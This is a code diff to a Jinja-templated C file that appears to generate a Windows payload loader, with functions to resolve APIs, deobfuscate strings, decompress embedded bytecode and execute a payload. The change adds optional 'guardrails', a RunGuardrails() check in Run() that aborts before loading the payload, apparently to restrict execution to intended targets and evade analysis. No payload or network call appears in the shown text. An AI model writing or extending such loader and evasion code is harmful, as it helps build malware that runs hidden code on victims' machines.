@@ -8,6 +8,9 @@
 #include <winhttp.h>
 #define INTERNET_SCHEME_UNKNOWN ((INTERNET_SCHEME)-1)
 {% endif %}
+{% if guardrails_needed %}
+#include <ntsecapi.h>
+{% endif %}
 {% if debug_mode %}
 #include <stdio.h>
 #include <debugapi.h>
@@ -68,6 +71,10 @@ char debug_buffer[512];
 {% if bytecode_compression == 'mszip_compressor' %}
     {% include 'partials/decompress_mszip.c.j2' %}
 {% endif %}
+{% if guardrails_needed %}
+    {% include 'partials/guardrails.c.j2' %}
+{% endif %}
+
 
 // --- Function Forward Declarations ---
 BOOL LoadData(PBYTE* ppData, PDWORD pdwDataSize);
@@ -76,6 +83,9 @@ void ExecutePayload(void* exec_mem, const unsigned char* payload, SIZE_T payload
 void ResolveAPIs();
 {% if string_obfuscation_needed %}
 void DeobfuscateString(unsigned char* data, size_t len);
+{% endif %}
+{% if guardrails_needed %}
+BOOL RunGuardrails();
 {% endif %}
 
 // --- Main Logic ---
@@ -91,6 +101,13 @@ void Run() {
     void* exec_memory_block = NULL;
 
     ResolveAPIs();
+
+    {% if guardrails_needed %}
+    if (!RunGuardrails()) {
+        DEBUG_PRINT("Run: Guardrails failed. Terminating.");
+        return;
+    }
+    {% endif %}
 
     if (!LoadData(&initial_data, &initial_len)) {
         DEBUG_PRINT("Run: Failed to load initial data");
